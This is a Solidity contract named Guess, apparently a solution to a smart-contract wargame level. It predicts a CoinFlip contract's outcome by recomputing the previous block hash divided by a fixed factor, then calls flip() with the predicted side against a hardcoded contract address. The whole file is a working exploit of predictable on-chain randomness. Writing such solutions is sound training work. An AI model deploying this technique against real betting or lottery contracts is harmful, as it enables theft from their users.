// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';
import './Coin_Flip.sol';

contract Guess {

  using SafeMath for uint256;
  CoinFlip coin_flip_contract;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() public {
    coin_flip_contract = CoinFlip(0xF4f95F0Eb85ac7e69A1D32BcA05e655A1f42a22F);
  }

  function guess() public {
      uint256 blockValue = uint256(blockhash(block.number.sub(1)));
      uint256 coinFlip = blockValue.div(FACTOR);
      bool side = coinFlip == 1 ? true : false;

      coin_flip_contract.flip(side);
  }
}